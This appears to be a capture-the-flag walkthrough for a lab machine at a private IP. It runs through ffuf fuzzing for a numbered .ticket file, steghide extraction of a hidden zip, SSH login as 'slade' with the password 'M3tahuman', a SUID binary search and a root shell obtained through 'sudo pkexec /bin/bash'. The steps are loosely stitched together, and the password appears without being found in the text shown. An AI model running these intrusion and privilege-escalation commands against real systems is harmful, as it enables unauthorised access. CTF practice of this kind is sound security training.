Since you are in the directory /island/2100/, you now need to find a file that ends in **.ticket**. Based on the hint, it is likely that the filename itself is **also a number**.

Here is how to solve this using ffuf:

### 1. Fuzz for the .ticket file inside that directory

You know the directory is 2100. Now you need to find which number (1-9999) followed by .ticket exists inside it.
```
seq 1 9999 | ffuf -w - -u http://10.112.141.99/island/2100/FUZZ.ticket -mc 200
```
Search for the web directory
```
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.112.141.99/island/2100/FUZZ.ticket -mc 200 -ic -t 100
```

```bash
steghide extract -sf aa.jpg 
# If it asks for a passphrase, try: password
```
You have found the core piece of evidence! steghide worked on the .jpg because that is the format it supports (it generally doesn't work on PNGs), and it gave you **ss.zip**.

Now you need to deal with that zip file. In most CTFs, these zip files are **password protected**.

### 1. Try to Unzip

First, see what's inside the zip without extracting it:

codeBash

```
unzip -l ss.zip
```

(You will likely see a file inside called shado.)

Now, try to extract it:
```
unzip ss.zip
```
Now that you have a potential password for slade, leave the web/FTP behind and log into the system:
```
ssh slade@10.112.141.99
```
**A. Check Sudo permissions:**  
First, check if slade can run any commands as root without a password:

```
sudo -l
```

(If it asks for a password, use M3tahuman again.)

**B. Check for SUID binaries:**  
If sudo -l doesn't give you much, look for files that have the SUID bit set:

```
find / -perm -4000 2>/dev/null
```
### Escalating to Root

Since you have sudo permissions for pkexec, you can simply use it to spawn a root shell.

Run this command:

codeBash

```
sudo pkexec /bin/bash
```

- When it asks for a password, use: M3tahuman
    

---

### 2. Verify Root Access

Once the command runs, your prompt should change (usually from $ to #). Verify your identity:

codeBash

```
whoami
```

It should return: **root**.